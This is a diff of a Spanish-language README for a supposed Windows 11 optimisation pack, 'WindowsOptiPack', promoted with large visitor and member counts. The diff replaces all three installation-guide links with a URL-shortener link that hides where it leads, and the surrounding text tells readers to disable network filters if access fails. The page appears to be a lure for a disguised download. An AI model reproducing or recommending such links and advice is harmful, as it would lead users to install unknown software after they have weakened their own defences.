@@ -6,7 +6,7 @@
 
 **Acerca de WindowsOptiPack**: WindowsOptiPack es un repositorio para usuarios de *Windows 11 24H2* en Windows, con herramientas y configuraciones comunitarias para optimizar el sistema operativo. Mejora el rendimiento, reduce tiempos de carga y potencia flujos de trabajo cotidianos para una experiencia fluida. Con 200K+ visitantes y 160K+ miembros, ¡eleva tu productividad hoy!
 
- <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/hrNrCnnL" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
 
@@ -22,7 +22,7 @@ Mejora tu *Windows 11 24H2* con **WindowsOptiPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/hrNrCnnL" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
 
@@ -36,7 +36,7 @@ Mejora tu *Windows 11 24H2* con **WindowsOptiPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 160K+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tu sistema.
 
- <a href="https://windows-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/hrNrCnnL" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="100" style="border:none;">
 </a>
 
